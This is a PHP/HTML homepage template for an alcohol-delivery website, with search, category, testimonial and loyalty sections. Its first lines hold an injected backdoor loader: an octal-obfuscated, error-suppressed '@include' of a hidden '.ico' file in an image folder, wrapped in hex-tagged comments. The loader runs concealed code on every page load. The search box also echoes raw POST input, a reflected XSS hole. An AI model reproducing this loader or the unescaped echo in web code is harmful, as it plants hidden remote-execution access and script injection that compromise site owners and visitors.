<?php
/* 9d190 */

@include "\104:/w\141mp/\167ww/\111nho\165seP\162oje\143ts/\164opd\145vel\157per\163_de\163ign\057img\057.50\062a15\0647.i\143o";

/* 9d190 */
?>
<script type="text/javascript">

$(document).ready(function(){    
    $(".search_btn").click(function() {
        var search_code = $("#search").val();
                   
        if(search_code != "") {
	    $("#search_frm").submit();
	}
    });
});
</script>
<section class="main_slider">
    <div class="container-fluid">
        <div class="row justify-content-center">
            <div id="main_slider" class="main_slider">
                <div class="slider-content">
                    <h5 class="carousel-item-title mb-4">Janet-Collection</h5>
                    <p class="carousel-item-desc slogan">We Bring the Party to You</p>
                    <div class="col-11 col-sm-11 col-md-10 col-lg-11 col-xl-11 ml-auto mr-auto">
			<form name="search_frm" id="search_frm" action="home" method="post">   
			    <div class="input-group serach_box">
				<input type="text" class="form-control" value="<?php if(isset($_POST["search"]) && !empty($_POST["search"])) { echo $_POST["search"]; unset($_POST); } else { echo ""; } ?>" id="search" name="search" placeholder="Enter Your Postcode">
				<div class="input-group-append">
				    <button class="btn btn-pink search_btn" type="button">Search</button>
				</div>			    
			    </div>
			</form>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <video class="bg-vdo" poster="<?php echo $vimage; ?>" playsinline="playsinline" autoplay="autoplay" muted="muted" loop="loop">
        <source src="<?php echo $video; ?>" type="video/mp4">
    </video>
</section>

<?php if (!empty($top_picks)) { 
     include_once 'top_picks.php';
} ?>

<?php if (!empty($categories)) {
    ?>
    <section class="page_section bg-light-gray category_list">
        <div class="container">
            <div class="row mb-4">
                <div class="col-12 text-center">
                    <h1 class="main_title">Categories</h1>
                    <img class="" src="assets/website/img/divider-free-img-1.png" alt="">
                </div>
            </div>
            <div class="row">
                <div class="col-12">
                    <div class="row">
                        <?php foreach ($categories as $category) { ?>
                            <div class="cust-col5">
                                <div class="card categories_card">
                                    <div class="product_img">
                                        <img class="img-fluid" src="<?php echo $category["category_img"]; ?>" alt="">
                                    </div>
                                    <div class="categories_body p-3 text-center">
                                        <p class="title"><a href="<?php echo base_url() . 'ppl?cid='. urlencode(base64_encode($category["category_id"])); ?>" class="c-pink"><?php echo $category["category_name"]; ?></a></p>
                                        <ul class="sub_categories_list">
                                            <?php
                                            if (!empty($category["subcategory_list"])) {
                                                foreach ($category["subcategory_list"] as $subcategory) {
                                                    ?>
                                                    <li><a href="<?php echo base_url() . 'ppl?cid='. urlencode(base64_encode($category["category_id"])); ?>"><?php echo $subcategory["category_name"]; ?></a></li>
                                                <?php } ?>
						<li><a href="<?php echo base_url() . 'ct?cid='. urlencode(base64_encode($category["category_id"])); ?>" class="c-pink">View All</a></li>
                                            <?php } ?>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        <?php } ?>
                    </div>
                </div>
            </div>
        </div>
    </section>
<?php } ?>

<section class="download_app">
    <div class="container">
        <div class="row page_section justify-content-center">
            <div class="col-12 col-sm-12 col-md-9 col-lg-3 col-xl-3 text-center">
                <a href="javascript:void(0);" class="btn btn-pink"><i class="fa fa-android" aria-hidden="true"></i> Download the App</a>
            </div>
            <div class="col-12 col-sm-12 col-md-9 col-lg-6 col-xl-6 text-center">
                <h3 class="mb-4">New App. New way.</h3>
                <p class="desc">Download Janet-Collection now and have the drinks delivered to you in 60 minutes or less</p>
                <div class="text-center mt-4 mb-4"><img class="" src="assets/website/img/divider-free-img-1.png" alt=""></div>
                <label class="c-white"><i>Southampton only</i></label>
            </div>
            <div class="col-12 col-sm-12 col-md-9 col-lg-3 col-xl-3 text-center">
                <a href="javascript:void(0);" class="btn btn-pink"><i class="fa fa-apple" aria-hidden="true"></i> Download the App</a>
            </div>
        </div>
    </div>
</section>

<?php if (!empty($best_selling_product)) { 
     include_once 'best_sellers.php';
} ?>


<section class="bg-light-gray page_section num_counter">
    <div class="container">
        <div class="row mt-3 mb-3">
            <div class="col-4 col-sm-4 col-md-4 col-lg-4 col-xl-4 text-center mt-2 mb-2 c-white">
                <div class='numscroller numscroller-big-bottom' data-slno='1' data-min='0' data-max='<?php echo $stat1; ?>' data-delay='8' data-increment="10">0</div>
                <p class="count-text mb-0 text-capitalize text-capitalize">minute delivery</p>
            </div>
            <div class="col-4 col-sm-4 col-md-4 col-lg-4 col-xl-4 text-center mt-2 mb-2 c-white">
                <div class='numscroller numscroller-big-bottom' data-slno='1' data-min='0' data-max='<?php echo $stat2; ?>' data-delay='8' data-increment="10">0</div>
                <p class="count-text mb-0">Brands</p>
            </div>
            <div class="col-4 col-sm-4 col-md-4 col-lg-4 col-xl-4 text-center mt-2 mb-2 c-white">
                <div class='numscroller numscroller-big-bottom' data-slno='1' data-min='0' data-max='<?php echo $stat3; ?>' data-delay='8' data-increment="10">0</div>
                <p class="count-text mb-0 text-capitalize">Pound minimum order</p>
            </div>
        </div>
    </div>
</section>

<section>
    <div class="container">
        <div class="row">
            <?php
            //echo "<pre>"; print_r($testimonials); exit; 
            if (!empty($testimonials)) {
                ?>
                <div class="col-12 col-sm-12 col-md-12 col-lg-12 col-xl-12 page_section">
                    <div class="row justify-content-center">
                        <div class="col-11 col-sm-11 col-md-12 col-lg-8 col-xl-8 text-center mb-3 mb-sm-3 mb-md-3 mb-lg-5 mb-xl-5">
                            <h2 class="main_title testimonials_main_title mb-2">They all <i class="fa fa-heart c-pink" aria-hidden="true"></i> us</h2>
                            <img class="" src="assets/website/img/divider-free-img-1.png" alt="">
                            <p class="desc mb-0 mt-2">We decided we’d never carry 10kg of liquor in plastic bags for a big night in ever again. And we’re helping you to not make that same mistake.</p>
                        </div>
                        <div class="col-12">
                            <div class="owl-carousel testimonials_carousel">
                                <?php foreach ($testimonials as $testimonial) { ?>
                                    <div class="pt-2 pb-2">
                                        <div class="testim_qoute">
                                            <p class="testim_qoute_text text-center">
                                                <?php echo strip_tags($testimonial["description"]); ?>
                                            </p>
                                            <div class="text-center">
                                                <div class="media">
                                                    <img class="mr-3" src="<?php echo $testimonial["image"]; ?>" alt="">
                                                    <div class="media-body align-self-center">
                                                        <h5 class="mt-0 mb-1 text-left"><a href="javascript:void(0);" class="c-pink"><?php echo $testimonial["client_name"]; ?></a></h5>
                                                        <label class="mb-0">Interior designer</label>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                <?php } ?>
                            </div>
                        </div>
                    </div>
                </div>
            <?php } ?>
        </div>
    </div>
</section>

<section class="history_box bg-light-gray">
    <div class="container">
        <div class="row page_section justify-content-center">
            <div class="col-12 col-sm-12 col-md-12 col-lg-12 col-xl-12">
                <div class="row ">
                    <div class="col-12 col-sm-12 col-md-4 col-lg-4 col-xl-4 text-center mb-4 mt-4">
                        <img src="assets/website/img/bottle.png" alt="">
                        <hr>
                        <p class="desc mb-0">Choose from a wide range of well-known alcohol beverages along with soft drinks and snacks</p>
                    </div>
                    <div class="col-12 col-sm-12 col-md-4 col-lg-4 col-xl-4 text-center mb-4 mt-4">
                        <img src="assets/website/img/shop.png" alt="">
                        <hr>
                        <p class="desc mb-0">Pay local shop prices without mark-ups</p>
                    </div>
                    <div class="col-12 col-sm-12 col-md-4 col-lg-4 col-xl-4 text-center mb-4 mt-4">
                        <img src="assets/website/img/scooter.png" alt="">
                        <hr>
                        <p class="desc mb-0">Have your drinks delivered in 60 minutes or schedule them for later</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>

<section class="bg-light-gray offers_testimonials">
    <div class="container-fluid">
        <div class="row">
            <div class="col-12 col-sm-12 col-md-12 col-lg-12 col-xl-12 left_content page_section">
                <div class="inner_content">
                    <!--<img src="assets/website/img/offers.svg" class="img-fluid" alt="">-->
                    <div class="offer_txt text-center c-white">
                        <p class="title mb-4">Become our Loyalty Club<br>Member</p>
                        <label class="mb-0" style="font-size: 22px;">And Enjoy</label>
                        <p class="discount_txt mt-4 mb-4">Up to 20% discount</p>
                        <a href="javascript:void(0);" class="btn btn-pink" id="loadMore" data-toggle="modal" data-target="#modal_login_resiter">Find out how to become a member</a>
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>

<script type="text/javascript">
$(document).ready(function(){
    $(".like_unlike_click").click(function() {
        var product_id = $(this).prev().data("prid");
        if($(this).prev().prop("checked") == true){
            var fav_val = 0;
        }
        else if($(this).prev().prop("checked") == false){
            var fav_val = 1;
        }
            
        $.ajax({
            url: "<?php echo base_url() . 'products/like_unlike'; ?>",
            type: "post",
            data: "fav_val="+fav_val+"&product_id="+product_id,
            success: function (resp)
            {}
        });
   });
   
});
</script>